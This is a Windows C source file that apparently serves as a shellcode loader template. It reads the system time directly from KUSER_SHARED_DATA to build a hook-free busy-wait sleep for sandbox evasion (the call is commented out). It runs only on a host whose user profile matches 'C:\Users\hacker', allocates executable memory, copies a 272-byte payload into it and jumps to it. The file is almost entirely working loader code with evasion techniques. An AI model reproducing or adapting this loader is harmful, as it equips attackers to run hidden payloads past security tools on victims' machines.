#include <Windows.h>

#include <time.h>

char *supermega_payload;

int get_time_raw() {
    ULONG* PUserSharedData_TickCountMultiplier = (PULONG)0x7ffe0004;
    LONG* PUserSharedData_High1Time = (PLONG)0x7ffe0324;
    ULONG* PUserSharedData_LowPart = (PULONG)0x7ffe0320;
    DWORD kernelTime = (*PUserSharedData_TickCountMultiplier) * (*PUserSharedData_High1Time << 8) +
        ((*PUserSharedData_LowPart) * (unsigned __int64)(*PUserSharedData_TickCountMultiplier) >> 24);
    return kernelTime;
}


int sleep_ms(DWORD sleeptime) {
    DWORD start = get_time_raw();
    while (get_time_raw() - start < sleeptime) {}
}

int main()
{
	//sleep_ms(10000);

	// Execution Guardrail: Env Check
	//wchar_t envVarName[] = {'U','S','E','R','P','R','O','F','I','L','E', 0};
	//wchar_t tocheck[] = {'C',':','\\','U','s','e','r','s','\\','h','a','c','k','e','r', 0}; // L"C:\\Users\\hacker"
	wchar_t envVarName[] = L"USERPROFILE";
	wchar_t tocheck[] = L"C:\\Users\\hacker";
	WCHAR buffer[1024];  // NOTE: Do not make it bigger, or we have a __chkstack() dependency!
	DWORD result = ((DWORD(WINAPI*)(LPCWSTR, LPWSTR, DWORD))GetEnvironmentVariableW)(envVarName, buffer, 1024);
	if (result == 0) {
		return 6;
	}
	if (mystrcmp(buffer, tocheck) != 0) { 
		return 6;
	}

	// Allocate 1
    // char *dest = ...
    char *dest = VirtualAlloc(NULL, 272, 0x3000, 0x40);

	// Copy (and decode)
	// from: supermega_payload[]
	// to:   dest[]
    for (int n=0; n<272; n++) {
        dest[n] = supermega_payload[n];
    }


    // Execute *dest
    (*(void(*)())(dest))();

	return 0;
}

int mystrcmp(wchar_t* str1, wchar_t* str2) {
	int i = 0;
	while (str1[i] != L'\0' && str2[i] != L'\0') {
		if (str1[i] != str2[i]) {
			return 1;
		}
		i++;
	}
	return 0;
}